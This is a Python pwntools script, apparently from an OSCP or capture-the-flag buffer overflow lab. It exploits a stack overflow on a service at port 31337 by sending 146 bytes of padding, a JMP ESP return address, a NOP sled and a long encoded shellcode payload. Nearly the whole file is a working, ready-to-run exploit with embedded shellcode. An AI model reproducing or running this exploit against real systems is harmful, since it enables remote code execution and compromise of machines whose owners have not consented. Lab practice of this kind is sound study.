#!/usr/bin/env python3
from pwn import *
import os
## ---- Setup For HOST ----
ip = "10.10.142.146" # CHANGE THIS TO MACHINE IP
port = 31337
## ------------------------


offset  = 146
overflow= b"A" * offset
retn    = b"\xC3\x14\x04\x08" # JUMP ESP Address set to little endian      
padding = b"\x90" * 16 # NOP(No OPeration) prepare for ASLR '\x90' * 16

# Payload for finding the Offset. Comment this to change the payload
# payload = open('pattern.txt', 'r').read()
payload = (b"\xbb\xcd\xce\x71\x4d\xda\xd6\xd9\x74\x24\xf4\x58\x29\xc9"
b"\xb1\x5e\x31\x58\x15\x83\xc0\x04\x03\x58\x11\xe2\x38\x32"
b"\x99\xc2\xc2\xcb\x5a\xbd\x4b\x2e\x6b\xef\x2f\x3a\xde\x3f"
b"\x24\x6e\xd3\xb4\x68\x9b\xda\x35\x83\x14\x56\xec\x10\x28"
b"\x4f\xc1\xe6\x61\xb3\x40\x9a\x7b\xe0\xa2\xa3\xb3\xf5\xa3"
b"\xe4\x05\x73\x4b\xb8\xc2\xf0\xc1\x2c\x66\x44\xda\x4d\xa8"
b"\xc2\x62\x35\xcd\x15\x16\x89\xcc\x45\x5c\x59\xd7\x35\xe8"
b"\x01\xc7\xb4\x3d\x34\xce\xc3\xfd\x07\x2e\x62\x75\x53\x5b"
b"\x74\x5f\xaa\x9b\xdb\x9e\x03\x16\x25\xe6\xa3\xc9\x50\x1c"
b"\xd0\x74\x63\xe7\xab\xa2\xe6\xf8\x0b\x20\x50\xdd\xaa\xe5"
b"\x07\x96\xa0\x42\x43\xf0\xa4\x55\x80\x8a\xd0\xde\x27\x5d"
b"\x51\xa4\x03\x79\x3a\x7e\x2d\xd8\xe6\xd1\x52\x3a\x4e\x8d"
b"\xf6\x30\x7c\xd8\x87\xb8\x7f\xe5\xd5\x2e\x4c\x28\xe6\xae"
b"\xda\x3b\x95\x9c\x45\x90\x31\xad\x0e\x3e\xc5\xa4\x18\xc1"
b"\x19\x0e\x48\x3f\x9a\x6f\x41\x84\xce\x3f\xf9\x2d\x6f\xd4"
b"\xf9\xd2\xba\x41\xf3\x44\x4f\x92\x26\x35\x27\x98\x28\x30"
b"\x81\x15\xce\x6a\xa1\x75\x5e\xcb\x11\x36\x0e\xa3\x7b\xb9"
b"\x71\xd3\x83\x13\x1a\x7e\x6c\xca\x73\x17\x15\x57\x0f\x86"
b"\xda\x4d\x6a\x88\x51\x64\x8b\x47\x92\x0d\x9f\xb0\xc5\xed"
b"\x5f\x41\x60\xee\x35\x45\x22\xb9\xa1\x47\x13\x8d\x6e\xb7"
b"\x76\x8d\x68\x47\x07\xa4\x03\x7e\x9d\x88\x7b\x7f\x71\x09"
b"\x7b\x29\x1b\x09\x13\x8d\x7f\x5a\x06\xd2\x55\xce\x9b\x47"
b"\x56\xa7\x48\xcf\x3e\x45\xb7\x27\xe1\xb6\x92\x3b\xe6\x49"
b"\x61\x14\x4f\x22\x99\x24\x6f\xb2\xf3\xa4\x3f\xda\x08\x8a"
b"\xb0\x2a\xf1\x01\x99\x22\x78\xc4\x6b\xd2\x7d\xcd\x2a\x4a"
b"\x7e\xe2\xf6\x7d\x05\x8b\x09\x7e\xfa\x85\x6d\x7e\xfb\xa9"
b"\x93\x42\x2a\x90\xe1\x85\xef\xa7\xea\x1b\xc5\xdd\x82\x85"
b"\x8c\x5f\xcf\x35\x7b\xa3\xf6\xb5\x89\x5c\x0d\xa5\xf8\x59"
b"\x49\x61\x11\x10\xc2\x04\x15\x87\xe3\x0c")
buffer = overflow + retn + padding + payload 

## Exploiting 

try:
    r = remote(ip,port)
    r.sendline(buffer)
    # print(r.recvall())
    r.close()
except:
    print("[+] Could not connect.")
    r.close()


# print("[+] Mona : !mona compare -f C:\mona\oscp\\bytearray.bin -a 015E19F8")